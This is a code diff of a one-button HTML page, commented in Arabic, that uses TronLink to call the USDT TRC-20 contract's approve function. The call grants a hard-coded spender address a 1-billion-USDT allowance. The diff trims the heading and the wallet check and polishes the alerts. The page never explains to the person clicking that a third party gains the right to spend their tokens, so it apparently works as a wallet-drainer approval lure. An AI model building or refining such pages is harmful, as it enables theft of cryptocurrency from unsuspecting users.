@@ -5,30 +5,24 @@
   <title>Approve USDT (TRC20)</title>
 </head>
 <body>
-  <h2>Approve USDT (TRC-20)</h2>
+  <h2>Approve USDT</h2>
   <button onclick="approveUSDT()">Approve USDT</button>
 
   <script>
-    const usdtContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // عقد USDT الرسمي على TRON
+    const usdtContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // عقد USDT الرسمي
     const spenderAddress = "TQJw8P2QKvLoWk6JWv3mJdA34r8UvZcfWu"; // عنوان تجريبي
-    const approveAmount = "1000000000000000"; // 1,000,000,000 USDT (مع 6 أصفار عشرية)
+    const approveAmount = "1000000000000000"; // 1B USDT (مع 6 أصفار عشرية)
 
     async function approveUSDT() {
-      if (!window.tronWeb || !window.tronWeb.ready) {
-        alert("يرجى تثبيت TronLink وتسجيل الدخول.");
-        return;
-      }
-
       try {
         const contract = await window.tronWeb.contract().at(usdtContractAddress);
         const tx = await contract.approve(spenderAddress, approveAmount).send({
           feeLimit: 100_000_000
         });
-        alert('تم إرسال المعاملة: ' + tx);
-        console.log('Transaction:', tx);
+        alert('تم إرسال المعاملة بنجاح ✅\nTransaction ID:\n' + tx);
       } catch (error) {
-        console.error(error);
-        alert('حدث خطأ: ' + error.message);
+        console.error("❌ خطأ:", error);
+        alert("❌ فشل تنفيذ عملية Approve:\n\n" + (error.message || error));
       }
     }
   </script>
